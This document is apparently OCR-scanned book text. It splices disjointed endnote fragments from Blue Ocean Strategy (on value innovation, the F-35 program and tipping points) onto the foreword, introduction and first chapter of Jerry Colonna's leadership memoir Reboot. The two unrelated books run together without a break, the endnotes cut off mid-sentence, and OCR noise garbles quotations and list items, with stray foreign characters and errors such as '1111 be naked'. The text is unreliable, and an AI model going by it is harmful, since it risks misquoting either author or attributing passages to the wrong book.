buyers, for the company, and for\nsociety at large.\n\nNotes\nHelp!

Instead, they argue, companies should strive to\nmake the competition irrelevant by offering buyers a leap in value. Gary\nHamel (1998) argues that success for both newcomers and industry\nincumbents hinges upon the capacity to avoid the competition and to\nreconceive the existing industry model. He further argues (2000) that the\nformula for success is not to position against the competition but rather to\ngo around it.\n\n18 Value creation as a concept of strategy is too broad, because no\nboundary condition specifies how value should be created. A company\ncould create value, for example, simply by lowering costs by 2 percent.\nAlthough this is indeed value creation, it is hardly the value innovation that\nis needed to open new market space. Although you can create value by\nsimply doing similar things in an improved way, you cannot create value\ninnovation without stopping old things, doing new things, or doing similar\nthings in a fundamentally new way. Our research shows that given the\nstrategic objective of value creation, companies tend to focus on making\nincremental improvements at the margin. Although value creation on an\nincremental scale does create some value, it is not sufficient to make a\ncompany stand out in the crowd and achieve high performance.\n\n19 For examples of market pioneering that shoots beyond what buyers\nare ready to accept and pay for, see Gerard J. Tellis and Peter N. Golder\n(2002). In their decade-long study they observe that fewer than 10 percent\nof market pioneers became business winners, with more than 90 percent\nturning out to be business losers.\n\n20 For previous studies that challenged this dogma, see, for example,\nCharles W. L. Hill (1988) as well as R. E. White (1986).\n\n21 For discussions on the necessity to choose between differentiation and\nlow cost, see Porter (1980, 1985). Porter (1996) uses a productivity frontier\ncurve to illustrate the value-cost trade-off.\n\n22 Our studies revealed that value innovation is about redefining the\nproblem an industry focuses on rather than finding solutions to existing\nproblems.\n\n23 For discussions on what strategy is and is not, see Porter (1996). He\nargues that although strategy should embrace the entire system of activities\na firm performs, operational improvements can occur at the subsystem\nlevel.\n\n24 Ibid. Hence, innovations that happen at the subsystem level are not\nstrategy.\n\n25 Joe S. Bain is a forerunner of the structuralist view. See Bain (1956,\n1959).\n\n26 Although in different contexts, venturing into the new has been\nobserved to be a risky enterprise. Steven P. Schnaars (1994), for example,\nobserves that market pioneers occupy a disadvantaged position vis-a-vis\ntheir imitators. Chris Zook (2004) argues that diversification away from a\ncompany’s core business is risky and has low odds of success.\n\n27 Inga S. Baird and Howard Thomas (1990) argue, for example, that\nany strategic decision involves risk taking.\nChapter 2\n\n1 Alternatives go beyond substitutes. A restaurant, for example, is an\nalternative to the cinema. It competes for potential buyers who want to\nenjoy a night out, even though it is neither a direct competitor nor a\nsubstitute for the cinema in its functional offering. There are three tiers of\nnoncustomers a company can look to. For more detailed discussions on\nalternatives and noncustomers, see chapter 3 and chapter 5 of this book,\nrespectively.\n\n2 [yellow tail] has been ranked as one of the five most powerful wine\nbrands globally from 2008 to 2013 by “The Power 100—The World’s Most\nPowerful Spirits & Wine Brands” report.

After the McDonald’s\ninvestment, the company began to aggressively expand overseas. But after a\nspectacular start, losses quickly accumulated as Pret’s zealous expansion\nled it to take its eye off the ball. After pruning back its overseas operations\nand getting back to the basics, Pret turned around very quickly and went\ninto steady sales growth, with only a blip in the recession. There is an\nimportant lesson here for companies that create a blue ocean. While\nexcitement in the market will be great and new demand for blue ocean\nofferings strong, companies need to remain vigilant and not become lax or\ncompromise their standards as they roll out their blue ocean offering.\n\n2 JCDecaux is also the world’s largest provider of airport advertising and\ntransport advertising. The company has over | million advertising panels\nand reaches some 300 million people every day. JCDecaux generated\nrevenues of €2.676 billion in 2013.\n\n3 See Committee on Defense Manufacturing (1996), James Fallows\n(2002), and John Birkler et al. (2001).\n\n4 Department of Defense (1993).\n\n5 For more on the specifics on what the JSF was designed to achieve, see\nBill Breen (2002), Fallows (2002), Federation of Atomic Scientists (2001),\nDavid H. Freedman (2002), Nova (2003), and United States Air Force\n(2002).\n\n6 See, for example, Miller (2003) and Gasiorek-Nelson (2003). Miller,\nwho was vice admiral of the US Navy at the time, notes in his 2003 article,\n“The Joint Strike Fighter acquisition program began with early and\nsustained cooperation among government, industry, and the military and\nincluded designing with commonality among the services in mind—which\nhas kept costs down—as well as plenty of testing. The program is proving\nto be a model for success.” Relatedly, in Gasiorek-Nelson’s (2003) article,\nUnder Secretary of Defense for Acquisition and Technology Edward C.\nAldridge Jr., speaking at the Defense Transformation Acquisition and\nLogistics Excellence Conference in 2003, is noted as saying that the Joint\nStrike Fighter, “now, is a hugely successful international program.”\n\n7 Given the almost ten-year time lag from the conception of the JSF F-35\nstrategy to its planned realization in 2010 and the unusual high dependence\non a complex web of external stakeholders outside of the military’s\nhierarchical control, as we noted in our original book, the conceptual\nstrength of this strategic move does not in itself secure success. Here\nexecution challenges are very steep; the key decision makers of the military\nand Pentagon changed during the ten-year realization time and external\nstakeholders had diverging interests and understandings. Chapter 8 follows\nup the F-35 and discusses how it evolved to date in the context of the\nexecution issues involved with both internal and external stakeholders.\nChapter 6\n\n1 Rohlfs (1974) was the first to define and discuss network externalities.\nFor a survey of work on this, see Katz and Shapiro (1994).\n\n2 See Kenneth J. Arrow (1962) and Paul Romer (1990). It is worth noting\nthat both Arrow and Romer limited their discussion of nonrival and\nnonexcludable goods to technological innovations, as is the tradition in\neconomics. When the concept of innovation is redefined as value\ninnovation, which is more relevant at the microeconomic firm level, the\nimportance of the nonrival and nonexcludable notion is even more striking.\nThis is because technological innovation often has a greater excludable\ncomponent due to the possibility and relative ease of obtaining patent\nprotection.\n\n3 See Ford Motor Company (1924) and William J. Abernathy and\nKenneth Wayne (1974).\nChapter 7\n\n1 Tipping point leadership traces its roots to the field of epidemiology\nand the theory of tipping points. It hinges on the insight that in any\norganization, fundamental changes can happen quickly when the beliefs and\nenergies of a critical mass of people create an epidemic movement toward\nan idea. The first application of the term tipping points to social behavior\nwas in a 1957 study of racial segregation by Morton Grodzins (1957) and\nwas more fully developed by University of Maryland economist Thomas\nSchelling (1978). Later, Malcolm Gladwell’s book The Tipping Point\n(2000) popularized the notion and brought the term further into the common\nvernacular. It is important to note, however, that our treatment of the theory\nof tipping points differs from Gladwell’s in important ways. While\nGladwell focuses on what triggers epidemics in societies, we focus on\nleadership in the context of organizational transformation to understand\nhow leaders can overcome the four key organizational hurdles identified in\nour research as central blocks to strategy execution. As a result, the\nfundamental drivers, what we call disproportionate influence factors, that\nour research identified as key to create organizational transformation fast at\nlow cost differ from those of Gladwell’s mavens, connectors, and\nsalespeople. The two studies differ in both the context and the means to\ncreate epidemic change.\n\n2 See Joseph Ledoux (1998) and J. S. Morris et al.

As the ultimate outputs of an organization’s\nactivities are value for the buyer and revenue for itself and its inputs are the\ncosts to produce them and the people to deliver them, the three strategy\npropositions of buyer value, profit (revenue minus costs), and people\ncapture the essence of what an organization’s activity system does. Unlike\nmarketing, manufacturing, human resources, and other functions, a good\nstrategy should cover the entire activity system of an organization. A\nmarketing department, for example, may focus on the value proposition and\npay insufficient heed to the other two propositions. Similarly, a\nmanufacturing department may neglect buyer needs or may treat people as a\ncost variable. This is why a sustainable blue ocean strategy requires a fully\ndeveloped and consistent set of three propositions.\nChapter 11\n\n1 See Tellis and Golder (2002).\nAppendix A\n\n1 For a discussion of “creative destruction,” see Joseph A.

Only 10 percent mentioned the films (R.\nKoszarski, 1990). And 24 percent of exhibitors surveyed in 1922 said that\nthe quality of the feature film “made absolutely no difference” to success at\nthe box office; what mattered, they said, was the surrounding program\n(ibid.). In fact, cinema advertisements at the time tended to give as much\nprint to the music as they did to the films. With the introduction of sound\ntechnology in films in 1926, the importance of live music at the cinema (a\nband or orchestra and the associated costs) was dramatically reduced.\nPalace Theaters, with their elaborate décor, luxurious environment, and\nservices such as valet parking, were well placed to take advantage of this\nshift for more than ten years, until Americans began heading to small-town\nsuburbs in droves following World War II.\n\n27 Screen Source (2002).\nAppendix B\n\n1 The structuralist school of IO economics finds its origin in Joe S.\nBain’s structure-conduct-performance paradigm. Using a cross-industry\nempirical framework, Bain focuses mainly on the impact of structure on\nperformance. For more discussions on this, see Bain (1956, 1959).\n\n2 F. M. Scherer builds on Bain’s work and seeks to spell out the causal\npath between “structure” and “performance” by using “conduct” as an\nintervening variable. For more discussions, see Scherer (1970).\n\n3 Ibid.\n4 See Joseph A.

For example, once a problem\nis redefined by reconstruction of blue ocean strategy, problem-solving\nmethods such as Theory of Inventive Problem Solving, which has the\nRussian acronym TRIZ, can be used to identify innovative solutions for the\nredefined problem by exploring many possible resource recombinations.\nTRIZ was developed by G. Altshuller and his colleagues in the former\nUSSR. Based on more than three million patents, TRIZ codified patterns\nthat predict innovative solutions to given problems.\nAppendix C\n\n1 For further discussion on the market dynamics of value innovation, see\nKim and Mauborgne (19990).\n\n2 For discussion on the potential of increasing returns, see Paul Romer\n(1986) and W.

It\nwas the kind of dinner party at which a single topic was put to the entire\ngroup for discussion. That night each of us was asked to describe a\nmeaningful encounter with contemplative practice.\n\nWe listened quietly as the rotation went around the table. Jerry was up\nbefore me, and when he spoke, he referred to a very difficult period in his\nlife, one in which a book called Faith, which I had written, was among the\nresources that had helped him. The word faith, as I had used it, did not\nmean belief or doctrine or dogma—I saw faith as being about connection—\nbut our ability to connect to often hidden sources of strength within us, and\nour ability to connect to a picture of life bigger than just the immediate\ncircumstances we see before us.\n\nBy the time Jerry finished speaking, he was crying, and I was crying, too.\nIt has always meant a lot to me when someone appreciates Faith. Faith had\nbeen a difficult book for me to write. It was the story of my own faith\njourney, and it demanded revelations of my deepest heart values,\ndescriptions of my traumatic childhood, memories of my most significant\nmoments of despair, and a vulnerability about things I somehow never\nfound myself talking about ordinarily. My guide throughout that experience\nhad been a quotation from the writer Dorothy Allison: “Write the story that\nyou were always afraid to tell. I swear to you that there is magic in it, and if\nyou show yourself naked for me, 1111 be naked for you. It will be our\ncovenant.” Or, as a writer friend of mine urged me one stuck day, “Just tell\nthe truth.”\nJerry and I became good friends, and I was honored when he asked me to\nwrite this foreword. As soon as I began reading Reboot: Leadership and the\nArt of Growing Up, I saw his authenticity, compassion, and almost eerie\nacuteness of perception leap right off the page. I realized, “He really did tell\nthe truth.” That’s what makes this book a generous and important offering.\n\nImbuing leadership with depth, resolve, congruency, and resilience—as\nJerry describes in the following pages—inevitably involves discovering the\nadult within us: the capacity to face fears, to care about ourselves and others\nin a rare and potent balance, to be radically honest, to inquire within, and to\nlisten to others. We discover that adult capacity, in all its poignancy and\ntendemess, and we bring it into the light of day, and we nurture it and help\nit to grow.\n\nFor most of us, that capacity is often hidden in the shadows, and not just\nhidden, but intricately entangled with our persistent yet often hidden\nfeelings of unworthiness, our certainty of defeat, our fragmentation, our\nsense of isolation and emptiness, and our sense of overwhelm coupled with\nour conviction that we can never rest. Jerry’s gift is in helping us navigate\nthat landscape—to lean into that shadowy world and capture the treasures\nheld there, all the while learning to be both strong and kind to ourselves and\nto others.\n\nIf the book you are writing is asking honesty and clear discernment of the\nreader, offering a path to a fulfilling and true and liberating life change, then\nyou can’t write from a supercilious perch or make yourself immune to self-\nrevelation or imply that you have never struggled or had any difficulty\nperfectly manifesting the qualities you are talking about. You could try, of\ncourse, but it would show. What shows in contrast, in Jerry’s book, is his\nown stripping away of armor or defensiveness or obfuscation. I could sense\nthe validity in the comment one of Jerry’s friends had made to him:\n“Writing this book is gonna kick your butt.” I bet it did. Actually, I saw it\ndid.\n\nThat’s the beauty of determining if you are really going to speak from the\nheart: no imparting knowledge from on high, no separation from the many\ndilemmas and yearnings for success and even anguish of your audience. It’s\na powerful book, and a truly useful one, because Jerry kept that covenant.\nHe got naked. He told the truth.\n\nWhen Jerry first asked me to write the foreword, I was honored but\nuncertain. I asked, “Why not a mogul, a famous business success?” He\nreplied that this wasn’t an ordinary business book—it reconfigures notions\nof success itself and ideas of who we are and what would make us happy. It\nteaches us how, above all things, to be real. The journey laid out is a path to\nequanimity, or peace, which is priceless. The book is genuinely a\ntransmission, heart to heart.\n\n—Sharon Salzberg\nDedication of the Merit\n\nMay all beings enjoy happiness and the root of happiness.\n\nMay we be free from suffering and the root of suffering.\n\nMay we not be separated from the great happiness devoid of suffering.\n\nMay we dwell in the great equanimity free from passion, aggression, and prejudice.\n\n—A Buddhist prayer to cultivate the four immeasurables: Lovingkindness,\nCompassion, Empathy, and Equanimity\nIntroduction: Elevating Darkness\n\nI didn’t set out to write a book about growing up. But, as those who’ve\nattempted to get their thoughts down on paper know, the true nature of the\nbook revealed itself after I’d begun the excavations behind a simple\nquestion: What do I believe to be true about work, leadership, and how we\nmay live our lives?\n\nThe simplicity of the answer startled me: I believe that better humans\nmake better leaders. I further believe that the process of learning to lead\nwell can help us become better humans. By growing to meet the demands\nof the call to leadership, we’re presented with the chance to finally, fully,\ngrow up.\n\nSuch revealed wisdom is often better than discovered wisdom. It’s best, I\nsuspect, because it comes from our lived experiences and the intrinsic and\ninherent depths of our being. Moreover, such a revelation is better because\nit transforms us; it is a process that can come about only from learning to be\nstill, learning to listen.\n\nStanding still and powering down allow us to start anew and, if you will,\nreboot our core operating and belief systems. Standing still and listening\ndeeply to our heart as well as to the hearts around us are the necessary first\nsteps toward moving past merely, numbly, surviving our lives. As poet\nTerry Tempest Williams advises, we learn, then, to speak and “comprehend\nwords of wounding without having these words become the landscape\nwhere [we] dwell.” With such comprehending, we elevate the darkness of\nour lives, lead from the realm of the stars, and continue growing up.\nI had a sense that this was true at the very first planning meeting for the\nbook. Hollis Heimbouch, my editor (friend and teacher), and Jim Levine,\nmy agent (friend and teacher), and I sat at a conference table in Jim’s office\nto plot out the book. Earlier, Jim had shown me around his office, including\na small room filled with Muppet-like puppets. Glancing quickly at the\ncollection, one caught my attention. “Is that you?” I asked Jim. He laughed\nand said, somewhat shyly and with pride, “Yeah. That’s me.”\n\nBack at the table, we sat together. My heart raced. I squirmed\nuncomfortably while sweating. We talked about the books on leadership\nthat we admired. We spoke of writers who’d moved each of us. Jim spoke\nof the things I’d written, the questions I’d asked people to consider. “I love\nyour simple, powerful questions, like ‘What is work?’” he said. I was\npleased but still nervous. My eyes darted between the two of them.\n\nHollis had a hand on a large stack of papers; my work, old blog posts,\nand an interview or two. “I love the way you provoke people. You get them\nto think differently.”\n\nAs I looked from one to the other and back again, an insight struck me:\n“Wait. You don’t want me to write a book of advice about the five things\nevery entrepreneur should know about leadership?” Then—and this will\nsurprise no one who really knows me—I burst into tears.\n\n“Oh, no,” said a surprised Hollis while looking to Jim. “Not at all. We\nwant you to do your book.” They wanted me to write the book I was\nsupposed to write—my book.\n\nMy initial relief was quickly replaced by terror: I understood\nimmediately that the excavations necessary to make sense of these\nintertwined and interdependent truths—that leadership requires an authentic\nand vulnerable dive into the wrecks of our lives—would force me to grow\nin ways I hadn’t bargained for. After I started writing and began\nexperiencing all sorts of uncomfortable memories and revelations, a dear\nfriend warned, “Writing this book is gonna kick your butt.” So it went and\nso it still goes.\n\nThe personal challenge didn’t stem from coming to grips with writing\nwell about the how of leadership. The challenge stemmed from the demand\n1:4 placed on myself to show up fully, bravely, and to look inward without\nlooking away. While it is true that to lead with depth, resolve, congruency,\nand resilience you must have the faith to look inward, it is equally true that\nto speak of such things without being willing to reveal your own\nactualization, your own journey to adulthood, would be hollow and empty.\nHollow and empty would not suffice.\n\nTurning the pursuit of purpose, mission, and leadership into the means to\ndiscover the adult lurking within us requires that we show up with radical\nauthenticity. That “we” includes me. To live up to the belief that the pursuit\nof leadership requires a pursuit of growing up, we must be willing to work\nwith that which arises in the pursuit. This includes that which arises\nwhether we take our seat as a CEO, an author, or simply as ourselves, as we\nwere born. I wouldn’t ask you to do something that I am not willing to\nattempt myself.\n\nPerhaps my touch hasn’t been as light, deft, and skillful as I would have\nliked. Perhaps in my rush to share and grow, there’s a weightiness to my\nwords that I didn’t consciously intend or wouldn’t have chosen. Perhaps\nyou’d prefer that I told you how to do the job rather than ask you why\nyou’d like to do the job in the first place. Perhaps, then, I frustrate you. If\nso, forgive me. Sometimes, as my daughter Emma once observed, I ask the\nquestions you’d rather not answer. Sometimes, though, my wish to elevate\nthe darkness to the realm of the stars gets the better of me.\n\nThe Formula\n\nAs often happens, I hit upon the insight I needed when I wasn’t searching\nfor it. A few years back I was pacing the room, thinking about the talk I was\nabout to give. There were thirty people in stiff, uncomfortable chairs. As\nusual, my T-shirt was mildly sweaty. As usual, I was shoeless—discalced. I\nwas struggling to explain coaching, struggling to explain why it was that, to\nhelp people lead well, I was pushing to help them know themselves better.\n\nThey were leaders, each of them. Some came from established\norganizations and were in the middle of their careers. Some were new to the\ndemands of organizational leadership. All of them were struggling. All of\nthem were there, in effect, for coaching.\n\nWith enthusiastic excitement and a touch of frustration, I grabbed some\ndry-erase markers and pulled a whiteboard to the front of the room. “It’s\nlike this . . . ,” I shared as I began sketching in my indecipherable scrawl,\n“everyone is always looking for the ‘how’ to do things.” And I wrote,\n“Practical Skills.”\n“But, really, they need to understand the ‘why’ of what they do, and\nultimately, who they are,” I continued, racing across the board, scrawling\nout, “Radical Self-inquiry.”\n\n“And when they do that, when they look in places they’ ve avoided, they\noften get stuck,” I continued. “They get scared. They get lost in their fears\nand in old patterns of self-loathing. So, mired in their self-criticism, they\nthink they’re the only one who hasn’t a fucking clue as to what they are\ndoing or how to live.\n\n“Worse,” I continued, “they’re too damned afraid to admit that they’re\nmaking shit up. And they stay stuck in these lonely leadership bubbles,\nspinning. Scared. Lonely. Afraid of being found out.” My words hung in the\nair. I could feel their bodies tensing with fear. I knew they were holding\ntheir breath.\n\n“But then someone is brave enough to go first. Some brave soul admits\nthat she feels in trouble. And the tribe around her lets out their breath.” The\nfolks in the room, first-time CEOs, each of them, let out a collective breath.\nI wrote, “Sharing the experience with friends and peers” on the whiteboard\nand, as I wrote, I said, “and suddenly people realize they’re not alone. And,\neven more, that if we’re all feeling this way, then maybe, just maybe, the\nfeelings may be true, but the facts may be inaccurate.”\n\nI turned back to the audience, pausing to let my words sink in: “You are\nnot alone.” A few folks begin to tear up. I turned to the board and sketched\nin plus signs between the statements, drew an equals sign underneath, as if I\nwere creating a fraction, a mathematical formula. Under the line I wrote,\n“Enhanced leadership plus greater resiliency.”\n\nPractical Skills Development + Radical\nSelf-Inquiry + Shared Experiences\n\nEnhanced Leadership + Greater Resiliency\n\nI then drew thick red lines under the word resiliency. “While I care about\nyou being better leaders,” I said, “I care more about you being able to\n\nsurvive. I want you to not make yourselves sick. I want you to be happy, to\nsee your families, even to have families, to lay your head down on the\npillow at night and rest in the belief that you are okay, that the world is\nokay, that all whom you love and care about are okay, and that even if\nthings don’t go as planned, you'll still be okay.\n\n“T want you to not end up wondering if the world would be better off\nwithout you. I want you to have peace of mind.” Resiliency, I stressed, is an\nantecedent to equanimity.\n\n“Practical skills,” I explained, “are the things that everyone believes\nnecessary to succeed as leaders.” They are the skills that describe the how\nof the job—the incredibly important, necessary, skills needed to grow and\nbuild organizations: How do you hire someone? How do you fire someone?\nHow do you scale a team? How do you raise the capital to launch a\nbusiness?\n\nDiscussing and encouraging people to share what they are going through\noften takes a little practice. I’ve got a well-earned reputation for making\npeople cry and, in a sense, I helped found an executive coaching company,\nReboot, to help folks do just that: to share what’s really going on. Whether\nit’s in individual sessions with a coach or at one of our “boot camps”—\nmulti-day immersive experiences that folks have come to call “Reboots”—I\nand my colleagues explain that the secret to getting people to cry is simply\nto ask them to feel. Or, more specifically, ask them to slow down enough to\nnotice how they are feeling. My radical, surprising, unprecedented question\nthat always does the trick is quite simple; I ask, “How are you?” But then I\nfollow it up with, “No. Really . . . how are you?” Not, I emphasize, the\nbullshit, throwaway line we toss at each other without thinking, the “I’m\nfine. How are you?” that passes for empathetic inquiry and honest\nconversation. I ask a genuinely curious, “How are you?” in a way that\nallows people to honestly inquire within and, equally important, share the\nresponse with others who have allowed themselves to be equally open.\n\n“Start with a genuine ‘How are you,”” I tell folks, “and then move on to\ndescribing the things—practical and existential—that are troubling you.”\nShare with folks and, equally important, stay open and listen to their\nanswers as well. Then simply notice how the isolation and overwhelm shift,\neven a tiny bit.\n\nBut the most challenging piece of the formula—indeed, the most\nimportant—is the notion of radically inquiring within. I define it as the\nprocess by which self-deception becomes so skillfully and compassionately\nexposed that no mask can hide us anymore. The notion is to recognize that,\nif things are not okay, if you’re struggling, you stop pretending and allow\nyourself to get help. Even more, it’s the process by which you work hard to\nknow yourself—your strengths, your struggles, your true intentions, your\ntrue motivations, the characteristics of the character known as “you.” The\nyou behind the masks, the stories, the protective but no longer useful belief\nsystems that have been presented for so long as the “you” that you would\nlike everyone to see.\n\nInvariably such inquiry involves getting to know, as the poet Adrienne\nRich says, “not the story of the wreck but the wreck itself.” With help,\npatience, courage, and guidance, we explore the wreck and retrieve the\ntreasure. Knowing how to survive and understanding what it takes to thrive\nare skills that come from our childhood. Take any random group of\nentrepreneurs, for example, and do a quick unscientific survey by asking\nthem to raise their hands if they grew up in an environment where at least\none parent had disappeared or left or was never present. Most hands will\nshoot up. Early promotion into adulthood is often painful and equally often\na sign of an early promotion into leadership. Probe a bit further and you\nmay find that leaders who have built their company may have\nunconsciously stacked the team with other folks who experienced such\nearly promotion.\n\nRadically inquiring within allows us to step back and see the patterns of\nour lives not as random acts of a willful or even vengeful god but as forces\nthat shape who we are. It’s this understanding that will make us not only\nbetter leaders but better, happier, more resilient people.\n\nNot Practical but Useful\n\nIn writing this book, my goal is to provide an experience that allows you to\ndo your work. I want you to experience being challenged to grow, to think\nabout the structures of your life. Reading the book should feel like a\ncoaching session or a boot camp, a time to step away from habitual and\nlong-held patterns, using tools of inquiry that tap into your unconscious\nmind, unmask you, and that can enhance your sense of community, which is\nessential to healing. A well-asked question creates a sense of well-being\neven as it disrupts the story making that has protected us for so long.\nAs you read this book, I’d like you to hold these questions in your heart:\n\nنے\n\n. How did my relationship to money first get formed and how does\nit influence the way I work as an adult? What was the belief\nsystem around money and work that I grew up with? (Chapter 1.)\n\nD\n\n. How can I lead with the dignity, courage, and grace that are my\nbirthright? How can I use even the loss of status and the challenge\nto my self-esteem that are inherent in leadership to grow into the\nadult I want to be in the world? (Chapter 2.)\n\n. In what ways have I depleted myself, run myself into the ground?\nWhere am | running from and where to? Why have I allowed\nmyself to be so exhausted? (Chapter 3.)\n\nLD\n\n上\n\n. Who is the person I’ve been all my life? What can that person\nteach me about becoming the leader I want to be? What was the\nstory my family told about being real, being vulnerable, being\ntrue? (Chapter 4.)\n\n. Why do I struggle so much with the folks in my life? Why are\nrelationships so difficult? What am I not saying to my co-founder,\nmy colleagues, my family members, my life partner that needs to\nbe said? (Chapter 5.)\n\n. What’s my purpose? Why does it feel I’m lost while I struggle to\nmove forward? How do I grow, transform, and find meaning?\n(Chapter 6.)\n\n. How has who I am shaped the ways I lead others and myself?\nWhat are the unconscious patterns of my character structure that\nare showing up in my organizations? (Chapter 7.)\n\nNn\n\nnN\n\naa\n\n০০\n\n. How might I survive my life of heartbreak? How might I live in\npeace? (Chapter 8.)\n\n. What kind of leader and adult am I? What is enough? How will I\nknow when my job is done? (Chapter 9.)\n\n\\o\n\nAs you read on, consider the lessons you have internalized about the risks\nand possibilities of being open, vulnerable, and real. What were you taught\nabout being yourself? What has been the benefit of following that teaching?\nWhat was the cost?\n\nWork gives us the means to create the physical safety upon which our\nlives depend. Work feeds and shelters us and those we love. Work can give\nus meaning. But work can also be a means of our suffering. By\nunderstanding what’s truly happening all around us, the ways our core\nbelief systems influence our everyday experience, we can extract meaning\nfrom the suffering, coax the lotus from the mud, as the Buddhists teach. But\nthis will happen only if we use those challenges that the calls to leadership\nmake on us, not only to grow up but also help us discover our why.\n\nThere are worthy, helpful, and pragmatic books that can help you focus\non the how. In the end, I suppose, I’ve always found more helpful resources\nthat have helped me unpack the whys of our lives. Helping people sort\nthrough the why of life helps them access all they need to know to answer\nthe hows that work demands. The hows of life and leadership are endless. If\nyou enhance your understanding of the why of who you are, you'll be able\nto face the unending uncertainty in the pursuit of the perfectly executed\nhow. Moreover, if such inquiry is done well, with well-asked questions and\ndeeply true answers, you will end up with a tailor-made how. Such work\nmay not feel quite so practical at first, but it is undeniably useful.\n\nThis is the goal of this book. To be useful in understanding the why of\nyour leadership. This is what I try to do with the leaders with whom I work\nevery day. This is my wish for you.\n\nThe Seedbed for Growth\n\nIn the space between our memories and the stories we create about\nourselves, we live our lives. We create our companies. We create our wishes\nand dreams and gather in those around us as our families and our\ncommunities.\n\nExploring that space between memories and the stories we create allows\nus to emerge as the leaders we were born to be. My journey as a leader has\ntaught me that my childhood demanded a hypervigilance and that, to stay\nsafe, I learned to work ceaselessly to try to make sense of the world (even\nas I was confronted with insensible acts and facts). As part of that effort, I\nlistened closely—collecting and holding the stories of those around me as\nclues to a puzzling life.\n\nThe result is that I often see, hear, sense things that others miss. This can\nbe a source of great wisdom. But this sensing can be an impediment to my\npeace of mind as well, for I can create whole ships of fiction out of the\nrandom flotsam and jetsam that float my way. Still, when I sit well and\nquietly, I can see a way through the puzzle, especially when another is\nblocked. I laugh as I recall that one of my favorite childhood pastimes was\ncompleting books of mazes. I like working my way out of mazes; I am good\nat it.\n\nAmong the many things I have seen and experienced is the wisdom of\nelders, those who have come before me; elders such as my longtime\npsychoanalyst Dr. Avivah Sayres, my Buddhist teacher Sharon Salzberg,\nand my dear friend and soul brother, Parker Palmer. Watching my elders\nage, I have come to understand the wisdom of not only growing up but\naging gracefully, and for one, entering death—the thing I fear most of all—\nwith courage and humor.\n\nI suspect such elder-wisdom stems from inquiring into the nature of\nsuffering and your formation. It manifests in a more complete\nunderstanding of your life, and when your work is done. “Enough,” as\nParker, writes in a beautiful poem called “Harrowing,” “The Job is done.”\n\nSuch elder-wisdom seeps into and strengthens my bones. There’s a\nwisdom in being able to discern when the job is done. For the job to be\ndone, we must know that it’s time to let go of the striving to become and\nallow ourselves the restful grace of simply being. In my effort to simply be,\nI’ve learned to balance the disquietude of the past with the life-giving\nexcitement of the future, the seedbed for the growing to come.\n\nHarrowing\n\nby Parker J. Palmer\n\nThe plow has savaged this sweet field\nMisshapen clods of earth kicked up\n\nRocks and twisted roots exposed to view\nLast years growth demolished by the blade\n\nI have plowed my life this way\n\nTurned over a whole history\n\nLooking for the roots of what went wrong\nUntil my face is ravaged, furrowed, scarred.\nEnough. The job is done.\n\nWhatever s been uprooted, let it be\n\nSeedbed for the growing thats to come.\n\nI plowed to unearth last year 8 reasons—\nThe farmer plows to plant a greening season.\nChapter 1\nPassing GO\n\nMom was my Monopoly buddy.\n\nWhen I was a boy, Mom and I spent hours playing Monopoly. To this\nday, I love rainy days, in part, because back then, when it rained, we’d\nspend the day playing board games, from Chutes and Ladders to The Game\nof Life. But I loved Monopoly most of all.\n\nI loved that it could take hours to play properly (not the “shortened”\nversion, where you dealt out the cards representing properties, but the right\nway ... the way according to the rules . . . where you collected properties\nonly after landing on them and buying or trading them). I loved collecting\nthose deeds. I loved being the thimble, the iron, the dog.\n\nI loved passing “00” and collecting $200. I felt great about amassing\nmoney but, most of all, I loved surprising people with what I was capable of\ndoing.\n\nWhen I was a boy, I wasn’t often seen. I was looked after, cared for. I was\nheld and comforted, especially after some painful experience. But I wasn’t\noften seen. I was a good boy when inside I wanted to rage. I tried hard, all\nthe time, when inside I wanted not to care. I was compliant, and therefore\ncomplicit, in not being fully appreciated.\n\nWhen I was a boy, and we played Monopoly, everyone would lay out\nmoney in front. Piles of currency neatly stacked and sorted: $500s, $100s,\n$50s, and so on. Not me, though. I’d keep all my money stacked together,\nunder the game board. I didn’t need to lay it out in front of me to know my\nworth. I’d keep track in my head of how much I had. And I’d surprise\neveryone by buying up their properties when they were bankrupt. I’d\nsurprise them with my cleverness and cunning.\n\nWhen my cunning, my skills, my ability to understand and work with\nmoney would be revealed, I’d feel seen not for being good—quiet,\ncompliant, a “good boy”—but for being me—a good person who was also\nsmart and skillful.\n\nWhat’s more, at seven, I came to understand that, while people might not\nsee you, might not get you, you could use that fact to survive.\n\nThe Game of Life, Hi! Ho! Cherry-O, and Monopoly taught me about\nlife.\n\nI learned, for example, that you needed money to win, to be safe, to never\nbe hungry. With it, you could buy real estate, you could put little green\nhouses on those properties, and then, over time, generate more money. If\nyou played the game right, you could generate enough to make sure that\nMom and Dad didn’t fight about having enough food. Dad wouldn’t yell at\nMom if you took more than two Oreos.\n\nThere were nine of us in the two-bedroom apartment on the ground floor\nof a small Brooklyn building owned by my grandfather. I was born in\nDecember 1963, a month after JFK was killed. By then, my oldest siblings,\nVito and Mary, were already beginning to cycle in and out of the house.\nWhile the same small space was home for all of us, it was rare that we’d all\nbe there at the same time.\n\nDad was a foreman at a printing company, a place at which he had\nworked since high school (and to which he came back after serving in the\narmy). Mom stayed home with us.\n\nDad was a good man whose broken heart sometimes led him to drink to\ndrunkenness. Mom was a good woman whose broken childhood led to\nmental illness that further led her to hear and see things that, as often as not,\nweren’t there.\n\nTogether, they had more kids than they could afford, financially as well\nas emotionally. Being number six of seven, I grew up wondering whether it\nwas I who had tipped the scales, broken the camel’s back. I worried I was\nthe mouth that was one too many to feed; the one who caused the whole lot\nof us to never have enough to feel safe, warm, and happy.\n\nMy mother’s father, Dominic Guido, was an iceman. He sold ice in the\nsummer, coal in the winter, and homemade wine all year long. Mom always\nsaid his shoulders were covered with hair to protect his body from the fifty-\npound blocks of ice he carried up the stoops of houses in Brooklyn. ٤۹\ndropped out of school in the sixth grade, in his home village in Italy, Palo\ndel Colle, just outside Bari. He’d made his way to the States and become an\nentrepreneur—someone no venture capitalist would ever fund, even though\nhe understood the most important principle of business: end the day with\nmore money than you began it.\n\nGrandpa always seemed to have enough and even a little extra to spare\nfor us. He owned the building where my family lived, the same building\nwhere my mother and then later my sisters would mop the hallways.\nGrandpa would visit on Saturdays, usually bringing food. My father would\nstiffen as Grandpa came down the hallway and into our apartment, filling\nthe room with the smell of woolen underwear and Old Spice.\n\nGrandpa and Dad had a hard relationship. There were a few possible\nreasons.\n\nFrom Grandpa’s perspective, I could see how he might have blamed Dad\nfor their having had all of us. Mom was pregnant with my brother Vito,\nafter all, when they got married. “She had too many kids,” I imagine him\nthinking, “that’s why she was sick.” And, of course, to their Catholic eyes,\nit was a sin that Mom was pregnant before marriage: 